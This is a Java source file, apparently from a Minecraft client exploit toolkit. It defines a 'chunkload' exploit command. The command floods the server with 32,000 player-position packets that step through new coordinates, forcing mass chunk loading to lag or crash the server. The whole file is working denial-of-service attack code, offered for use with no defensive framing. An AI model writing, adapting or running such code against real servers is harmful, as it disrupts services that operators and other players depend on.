package uwu.narumi.niko.exploit.impl.other;

import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;
import net.minecraft.util.BlockPos;
import uwu.narumi.niko.exception.ExploitException;
import uwu.narumi.niko.exploit.Exploit;
import uwu.narumi.niko.exploit.ExploitInfo;
import uwu.narumi.niko.exploit.ExploitType;
import uwu.narumi.niko.helper.ChatHelper;
import uwu.narumi.niko.helper.NetHelper;

@ExploitInfo(
    name = "chunkload",
    type = ExploitType.OTHER,
    usage = ".exploit chunkload",
    description = "LOL"
)
public class ChunkLoad extends Exploit {

  @Override
  public void execute(Object... args) throws ExploitException {
    ChatHelper.printMessage(String.format("Sending &8[&7Method: &d%s&7", getName()));

    long start = System.currentTimeMillis();
    double x = mc.thePlayer.posX;
    double y = mc.thePlayer.posY;
    double z = mc.thePlayer.posZ;

    for (int j = 0; j < 32000; j++) {
      NetHelper.sendPacket(new C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
    }

    ChatHelper.printMessage(String.format("Sent &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(),
        System.currentTimeMillis() - start));
  }

  public double getHighestBlock(double x, double z) {
    double y = 255;

    for (double pos = y; pos > 0; pos--) {
      if (!mc.theWorld.isAirBlock(new BlockPos(x, y, z)))
        return pos - 0.5;
    }

    return 0;
  }
}
